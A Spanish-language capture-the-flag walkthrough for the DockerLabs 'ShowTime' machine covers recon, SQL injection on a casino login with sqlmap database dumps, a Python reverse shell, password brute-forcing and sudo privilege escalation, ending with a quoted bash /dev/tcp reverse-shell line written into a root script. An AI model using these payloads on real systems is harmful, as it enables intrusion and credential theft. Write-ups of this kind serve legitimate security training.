# ShowTime
## Reconocimiento
### Nmap
En primer lugar empezamos como de costumbre por un escaneo de puertos, para ver a que nos enfrentamos, que puertos hay abiertos y los servicios de las versiones que estos están sirviendo. Dicho escaneo revela poca cosa, un servidor HTTP en el puerto 80 de título "cs":
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
|_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: cs

```
### Casino
Al visitar la página en cuestión nos encontramos con una página de un casino, hay varios juegos y botones pero todos son atrezzo menos el que lleva al panel de inicio de sesión. Examinando el código fuente no veo nada que me llame la atención a priori, y usando whatweb no identifico nada vulnerable por defecto en la página, de modo que vamos a centraros en el formulario de login. 
## Explotación
### SQLi
Tan sólo probando con una comilla en el campo del username me salta un error de mySql, lo que revela que el panel de login es vulnerable a SQLi. Con el primer payload (`' OR '1`) en ambos campos entro, pero no hay ninguna acción para llevar acabo más que cerrar sesión, lo que nos lleva de vuelta al panel de login. Esta vez vamos a probar a atacar el panel con SQLmap, mediante esta línea:
``` bash
❯ sqlmap -u "http://172.17.0.2/login_page/index.php" --dbs --level=5 --risk=3 --forms --batch --threads 10
```
la intención es enumerar las bases de datos contenidas en el sitio, cosa la cual conseguimos, a partir de aquí la idea es continuar enumerando las tablas y columnas hasta llegar a la información real de la base de datos que nos interesa: **users**. 
``` bash
❯ sqlmap -u "http://172.17.0.2/login_page/index.php" -D users --tables --level=5 --risk=3 --forms --batch --threads 10
❯ sqlmap -u "http://172.17.0.2/login_page/index.php" -D users -T usuarios --columns --level=5 --risk=3 --forms --batch --thr
❯ sqlmap -u "http://172.17.0.2/login_page/index.php" -D users -T usuarios --dump --level=5 --risk=3 --forms --batch --threads 10
```
La sucesión de esos tres comandos (evidentemente, explorando entre ellos las columnas y extrayendo la información relevante en el proceso) nos lleva a dar con tres usuarios y sus respectivas contraseñas, con ellas vamos a elaborar dos archivos, username.txt y passwd.txt para realizar un ataque de fuerza bruta con las credenciales obtenidas.
### Revshell
El ataque diccionario no da resultados, de modo que pruebo unas de las credenciales en el panel de login y accedo a una página que no había visto antes, un panel de administración que aparentemente permite la ejecución de cualquier comando Pyhton. Conseguimos fácilmente una reverse shell ejecutando el siguiente comando:
``` python
import os,pty,socket;s=socket.socket();s.connect(("192.168.1.157",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```
## Post-explotación
### Hidden text
Una vez dentro veo que no puedo hacer sudo -l, tampoco usar CURL para instalar LinPEAS y en los permisos SUID no veo nada interesante, tras buscar un rato encuentro un archivo llamado `.hidden_text.txt` en /tmp, el cual contiene una lista de trucos del GTA, con ella voy a intentar hacer bruteforce o bien al usuario joe o al usuario luciano, los cuáles encontré haciendo un cat a `/etc/passwd`. En principio el diccionario no sirve, pero después de atascarme durante un rato se me ocurre probar a pasar la lista a minúsculas, ya que todo esta en mayúsculas, y así obtengo la contraseña para el usuario joe.
### Joe
Al entrar como joe si que puedo lanzar sudo -l, y al hacerlo veo que puedo pivotar fácilmente al usuario luciano con el binario posh.
``` bash
joe@12ef731c3c67:~$ sudo -l
User joe may run the following commands on 12ef731c3c67:
    (luciano) NOPASSWD: /bin/posh
joe@12ef731c3c67:~$ sudo -u luciano /bin/posh
whoami
luciano
```
Aquí al ejecutrar sudo -l de nuevo nos encontramos con un script en que puede ejecutarse como root sin passwd, con lo cuál simplemente tendremos que editarlo para iniciar una nueva shell como root. 
## FF 
En este punto me atasqué durante un rato y me rendí, viendo el [writeup de 4bytes](https://github.com/4bytess/writeups/blob/main/dockerlabs/show%20time.md) entendí que lo que él hace es (ya que no hay editor de texto, que es donde yo me atasqué) utiliza echo para modificar el archivo que tiene permisos, con ``echo "#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/172.17.0.1/500 0>&1" > /home/luciano/script.sh``, una vez hecho eso simplemente queda ejecutar el script para ganar una shell root (aunque en su caso el optó por darse una revshell).
